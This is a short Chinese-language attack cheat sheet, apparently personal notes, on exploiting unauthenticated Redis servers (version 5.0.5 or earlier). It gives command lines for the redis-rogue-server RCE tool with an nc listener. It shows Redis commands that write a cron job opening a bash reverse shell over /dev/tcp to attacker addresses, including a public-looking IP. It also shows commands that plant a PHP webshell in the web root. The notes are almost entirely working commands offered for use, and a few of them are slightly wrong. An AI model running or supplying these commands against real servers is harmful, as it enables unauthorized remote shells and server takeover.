# redis-rogue-server rce

当 `redis` 可以远程访问并且Redis <= 5.0.5

1. 访问:0679端口。 查看是否可以远程访问

2. `redis-rogue-server.py -h`

 find / -name *redis* 找找绝对路径

3. 使用

```
python3 redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
                                远程主机            本地主机


# 开启监听
# nc相应端口
 nc -lvvp 9999

```
Redis未授权访问验证、获取敏感信息

　　Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。

这里我使用另一台安装了redis的centos远程连接测试

```bash
./redis-cli   -h   192.168.242.134.

redis 192.168.242.134:6379> info # 查看敏感信息

```

### 利用crontab反弹shell

>>直接向靶机的Crontab写入任务计划，反弹shell回来
```
redis 192.168.242.134:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.242.131/888 0>&1\n"
redis 192.168.242.134:6379> config set dir /var/spool/cron/
redis 192.168.242.134:6379> config set dbfilename root
redis 192.168.242.134:6379> save
```

set x "\n* * * * * bash -i >& /dev/tcp/2.82.140.145/5678 0>&1\n"

然后在攻击机（192.168.242.131）上启动 nc 监听 888端口，等待反弹shell。这过程需要一些时间。
```
nc -lvnp 888
```

bash -i >& /dev/tcp/192.168.91.1/5678 0>&1


### 写入webshell

当自己的redis权限不高时，可以向web里写入webshell，但需要对方有web服务且有写入权限。假设靶机里面存在WEB服务并且目录在 /var/www/html
```
redis 192.168.242.134:6379>config set dir /var/www/html

redis 192.168.242.134:6379>config set x "<?php phpinfo();?>"

redis 192.168.242.134:6379>config set dbfilename webshell.php

redis 192.168.242.134:6379>save
```